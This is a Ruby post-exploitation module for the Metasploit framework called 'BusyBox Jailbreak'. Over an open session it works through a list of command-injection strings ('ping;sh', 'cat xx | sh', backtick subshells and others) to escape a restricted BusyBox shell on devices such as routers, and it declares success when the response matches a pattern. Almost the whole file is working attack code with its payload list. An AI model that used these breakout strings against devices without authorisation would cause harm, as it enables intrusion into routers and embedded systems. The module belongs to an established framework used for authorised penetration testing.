##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post

  METHODS = [
    'cat xx || sh',
    'ping || sh',
    'echo `sh >> /dev/ttyp0`',
    'ping `sh >> /dev/ttyp0`',
    'cat `sh >> /dev/ttyp0`',
    'cat xx;sh',
    'echo xx;sh',
    'ping;sh',
    'cat xx | sh',
    'ping | sh',
    'cat ($sh)',
    'cat xx && sh',
    'echo xx && sh',
    'ping && sh'
  ]

  def initialize
    super(
      'Name'         => 'BusyBox Jailbreak ',
      'Description'  => %q{
        This module will send a set of commands to an open session that is connected to a
        BusyBox limited shell (i.e. a router limited shell). It will try different known
        tricks to jailbreak the limited shell and get a full BusyBox shell.
      },
      'Author'       => 'Javier Vicente Vallejo',
      'License'      => MSF_LICENSE,
      'Platform'      => ['linux'],
      'SessionTypes'  => ['shell']
    )
  end

  def run
    res = false

    METHODS.each do |m|
      res = try_method(m)
      break if res
    end

    print_error('Unable to jailbreak device shell') unless res
  end

  def try_method(command)
      vprint_status("jailbreak sent: #{command}")
      session.shell_write("#{command}\n")
      (1..10).each do
        resp = session.shell_read
        next unless resp.to_s.length > 0
        vprint_status("jailbreak received: #{resp}")
        if resp.downcase =~ /busybox/i && resp.downcase =~ /built.*in shell/i
          print_good("Jailbreak accomplished with #{command}")
          return true
        end
      end

      false
  end
end
